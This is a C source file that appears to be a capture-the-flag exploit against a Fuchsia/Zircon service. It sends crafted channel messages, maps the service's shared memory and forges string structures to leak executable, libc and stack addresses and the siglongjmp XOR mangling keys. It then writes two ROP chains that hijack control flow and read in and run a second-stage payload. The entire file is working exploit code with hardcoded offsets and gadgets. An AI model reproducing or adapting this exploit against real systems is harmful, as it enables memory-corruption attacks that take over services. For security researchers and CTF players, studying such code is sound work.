#define write 0x19410
#define read 0x19150
#define open 0x3e080
#define lstat 0x1b8a0
#define errno_loc 0x3de10
#define opendir 0x1c3e0
#define readdir 0x1c520
// in fdio
#define zx_vmar_root_self 0x3def0
#define zx_vmar_map 0x3df00

// in vdso
#define zx_channel_call 0x72b0
#define zx_channel_read 0x7732
#define zx_channel_write 0x776c

#define vdso_call6(name, a, b, c, d, e, f) \
  ((uint64_t (*)(void*, void*, void*, void*, void*, void*))(vdso+name))((void*)a, (void*)b, (void*)c, (void*)d, (void*)e, (void*)f)

#define vdso_call8(name, a, b, c, d, e, f, g, h) \
  ((uint64_t (*)(void*, void*, void*, void*, void*, void*, void*, void*))(vdso+name))((void*)a, (void*)b, (void*)c, (void*)d, (void*)e, (void*)f, (void*)g, (void*)h)

#define fdio_call7(name, a, b, c, d, e, f, g) \
  ((uint64_t (*)(void*, void*, void*, void*, void*, void*, void*))(fdio+name))((void*)a, (void*)b, (void*)c, (void*)d, (void*)e, (void*)f, (void*)g)

#define fdio_call3(name, a, b, c) \
  ((uint64_t (*)(void*, void*, void*))(fdio+name))((void*)a, (void*)b, (void*)c)

#define fdio_call2(name, a, b) \
  ((uint64_t (*)(void*, void*))(fdio+name))((void*)a, (void*)b)

#define fdio_call1(name, a) \
  ((uint64_t (*)(void*))(fdio+name))((void*)a)

#define fdio_call0(name) \
  ((uint64_t (*)(void))(fdio+name))()

void *getmap(char *fdio, uint32_t handle) {
  uint64_t res = fdio_call0(zx_vmar_root_self);
  uint64_t ret = 0;

  char buf[64];
  snprintf(buf, 63, "0x%x\n", res);
  fdio_call3(write, 1, buf, strlen(buf));

  fdio_call7(zx_vmar_map, res, 3, 0, handle, 0, 8192, &ret);
  return (void*)ret;
}

int sendd(char* vdso, uint32_t handle, char* data, uint32_t datalen) {
  return vdso_call6(zx_channel_write, handle, 0, data, datalen, 0, 0);
}

void svc_leak(char *fdio, char *vdso, uint32_t handle, char* shmem_addr, uint64_t addr, char *data, uint64_t size) {
  *((uint64_t*)(shmem_addr+0x70)) = addr;
  *((uint64_t*)(shmem_addr+0x78)) = size;
  *((uint64_t*)(shmem_addr+0x80)) = 0x8000000000000000 | size;

  uint64_t res;
  char bigbuf[0x2000];
  char handle_buf[40];

  res = sendd(vdso, handle, "\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb9aGj", 16);
  if (res != 0) {
    fdio_call3(write, 1, "broke3\n", 7);  
    return;
  }

  uint64_t bytes;
  uint64_t handles;

  memset(bigbuf, 0, 0x2000);
  memset(handle_buf, 0, 40);
  do {
    res = vdso_call8(zx_channel_read, handle, 0, bigbuf, handle_buf, 2048, 10, &bytes, &handles);
  } while (res == 0xffffffffffffffea);
  if (res != 0) {
    fdio_call3(write, 1, "broke4\n", 7);
    return;
  }

  memcpy(data, &bigbuf[0x120], size);
}

void main(char *fdio, char *vdso, char *pie) {
  uint32_t handle = *(uint32_t*)((*(uint64_t*)(pie+0x12140)) + 0x10);
  uint64_t res = fdio_call3(write, 1, "hello\n", 6);  

  /* Map shared memory chunk into our address space */
  char *req = "\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x89o|}\x01\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff1\x00\x00\x00\x00\x00\x00\x00";

  res = sendd(vdso, handle, req, 40);
  if (res != 0) {
    fdio_call3(write, 1, "broke\n", 6);  
    return;
  }

  uint64_t bytes;
  uint64_t handles;
  char bigbuf[2048];
  char buf[128];
  memset(bigbuf, 0, 2048);
  uint32_t handle_buf[10];
  memset(handle_buf, 0, 40);
  do {
    res = vdso_call8(zx_channel_read, handle, 0, bigbuf, handle_buf, 2048, 10, &bytes, &handles);
  } while (res == 0xffffffffffffffea);

  if (res != 0) {
    fdio_call3(write, 1, "broke2\n", 7);
    return;
  }

  uint32_t maphandle = handle_buf[0];
  char *addr = (char*)getmap(fdio, maphandle);

  snprintf(buf, 127, "%d 0x%x 0x%x\n", handles, handle_buf[0], addr);
  fdio_call3(write, 1, buf, strlen(buf));

  /* Obtain leaks from shared database structure */
  uint64_t svc_exe_base = *((uint64_t*)(addr+0x0)) - 0x13060;
  uint64_t svc_shmem_base = *((uint64_t*)(addr+0x50));
  uint64_t svc_stackptr = *((uint64_t*)(addr+0x60));

  snprintf(buf, 127, "0x%x 0x%x 0x%x\n", svc_exe_base, svc_shmem_base, svc_stackptr);
  fdio_call3(write, 1, buf, strlen(buf));

  /* Construct fake database strings to leak more stuff */
  svc_leak(fdio, vdso, handle, addr, svc_exe_base + 0x14018, bigbuf, 0x50);

  uint64_t svc_fdio_base = *((uint64_t*)(&bigbuf[0])) - 0x1af10; /* open */
  uint64_t svc_libc_base = *((uint64_t*)(&bigbuf[8])) - 0x547f0; /* zx_take_startup_handle */
  uint64_t svc_vdso_base = *((uint64_t*)(&bigbuf[16])) - 0x76a8; /* zx_handle_close */
  uint64_t svc_cxx_base = *((uint64_t*)(&bigbuf[0x38])) - 0xaa9d0; /* _ZdlPv */

  snprintf(buf, 127, "0x%x 0x%x 0x%x 0x%x\n", svc_fdio_base, svc_libc_base, svc_vdso_base, svc_cxx_base);
  fdio_call3(write, 1, buf, strlen(buf));

  /* Leak XOR keys for siglongjmp */
  uint64_t xor_keys[4];
  svc_leak(fdio, vdso, handle, addr, svc_libc_base + 0xAE278, (char *)xor_keys, 0x20);

  snprintf(buf, 127, "0x%x 0x%x 0x%x 0x%x\n", xor_keys[0], xor_keys[1], xor_keys[2], xor_keys[3]);
  fdio_call3(write, 1, buf, strlen(buf));

  /* RIP control */
  // Reset strings back to normal so we don't crash in dtor
  *((uint64_t*)(addr+0x70)) = 0x31;
  *((uint64_t*)(addr+0x78)) = 0;
  *((uint64_t*)(addr+0x80)) = 0x0100000000000000;

  /* 0x58 overlaps with handle which is zeroed during dtor - so call siglongjmp twice */

  uint64_t rop_ret = svc_exe_base + 0x00008649; // ret;
  *((uint64_t*)(addr+0x30)) = svc_shmem_base + 0x1000; /* quitfn */
  /* rip */ *((uint64_t*)(addr+0x40)) = xor_keys[0] ^ rop_ret;
  /* rsp */ *((uint64_t*)(addr+0x48)) = xor_keys[1] ^ (svc_shmem_base + 0x1100);
  /* rbp */ *((uint64_t*)(addr+0x50)) = xor_keys[2] ^ (svc_shmem_base + 0x1100);
  
  *((uint64_t*)(addr+0x1000+0x20)) = svc_libc_base + 0x54644; /* quitfn.dtor -> siglongjmp */
  /* ropchain 1 */
  *((uint64_t*)(addr+0x1100+0x08)) = svc_exe_base + 0x000071e6; /* pop rdi */
  *((uint64_t*)(addr+0x1100+0x10)) = svc_shmem_base + 0x1200;
  *((uint64_t*)(addr+0x1100+0x18)) = svc_libc_base + 0x54644; /* siglongjmp */

  /* rip */ *((uint64_t*)(addr+0x1200+0x00)) = xor_keys[0] ^ rop_ret;
  /* rsp */ *((uint64_t*)(addr+0x1200+0x08)) = xor_keys[1] ^ (svc_shmem_base + 0x1800);
  /* rbp */ *((uint64_t*)(addr+0x1200+0x10)) = xor_keys[2] ^ (svc_shmem_base + 0x1800);
  /* fs[0x18] */ *((uint64_t*)(addr+0x1200+0x18)) = xor_keys[3] ^ svc_stackptr;

  /* ropchain 2 */
  *((uint64_t*)(addr+0x1800+0x08)) = svc_exe_base + 0x000071e6; /* pop rdi */
  *((uint64_t*)(addr+0x1800+0x10)) = 3;
  *((uint64_t*)(addr+0x1800+0x18)) = svc_exe_base + 0x00007065; /* pop rsi */
  *((uint64_t*)(addr+0x1800+0x20)) = svc_shmem_base + 0x1800+0x40;
  *((uint64_t*)(addr+0x1800+0x28)) = svc_libc_base + 0x00068c46; /* pop rdx */
  *((uint64_t*)(addr+0x1800+0x30)) = 1000;
  *((uint64_t*)(addr+0x1800+0x38)) = svc_exe_base + 0x12900; /* read */
  //*((uint64_t*)(addr+0x1800+0x40)) = svc_exe_base + 0x12820; /* exit */
  *((uint64_t*)(addr+0x1800+0x40)) = svc_libc_base + 0x0005e3dc; /* jmp rax */
  //*((uint64_t*)(addr+0x1800+0x40)) = svc_libc_base + 0x00072699; /* pop rsp; ret */
  //*((uint64_t*)(addr+0x1800+0x48)) = svc_shmem_base + 0x1800 + 0x40; /* infinite loop */

  //sendd(vdso, handle, "\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb9aGj", 16); // ListKeys
  sendd(vdso, handle, "\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00{_5?", 16); // Reset
  do {
    res = vdso_call8(zx_channel_read, handle, 0, bigbuf, handle_buf, 2048, 10, &bytes, &handles);
  } while (res == 0xffffffffffffffea);

  snprintf(buf, 127, "%d\n", res);
  fdio_call3(write, 1, buf, strlen(buf));

  for(int i=0; i<100000000; i++)
    ;

  char *addr2 = (char*)getmap(fdio, maphandle);

  snprintf(buf, 127, "0x%x 0x%x\n", addr, addr2);
  fdio_call3(write, 1, buf, strlen(buf));

  fdio_call3(write, 1, addr, 8192);
  fdio_call3(write, 1, "\n", 1);
}
